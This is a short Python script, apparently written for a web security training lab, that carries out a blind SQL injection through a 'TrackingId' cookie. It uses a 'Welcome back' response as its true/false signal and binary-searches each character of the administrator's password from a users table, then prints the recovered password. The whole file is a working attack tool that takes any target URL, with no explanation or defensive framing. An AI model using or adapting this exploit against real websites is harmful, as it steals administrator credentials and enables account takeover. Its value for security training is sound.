import requests
import asyncio
import sys


def validPass(content):
    return 'Welcome back' in content


async def fetchPage(url,cookies):
    resp = requests.get(url,cookies=cookies)
    return resp.text
    
async def findChar(url,cookie,pos,start,end):
    half = (start+end)//2
    char = chr(half)
    eq_string = f"{cookie}' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username = 'administrator') = '{char}' AND 1=1 -- -"
    gt_string = f"{cookie}' AND (SELECT SUBSTRING(password,{pos},1) FROM users WHERE username = 'administrator') > '{char}' AND 1=1 -- -"
    send_value = {'TrackingId': eq_string}
    content = await fetchPage(url,send_value)
    if validPass(content):
        return char
    else:
        send_value = {'TrackingId': gt_string}
        content = await fetchPage(url,send_value)
        if validPass(content):
            return await findChar(url,cookie,pos,half,end) #MAIOR
        else:
            return await findChar(url,cookie,pos,start,half) #MENOR
    
    


async def main():
    URL = sys.argv[1]
    COOKIE = sys.argv[2]
    PASS_LENGHT = int(sys.argv[3])

    


    passw = ''
    print("Connectando...")
    for i in range(PASS_LENGHT):
        char = await findChar(URL,COOKIE,i+1,30,122)
        passw += char
        print('Password = '+passw,end='\r')
    print('Password Found!!: '+passw)
        
        
        
asyncio.run(main())


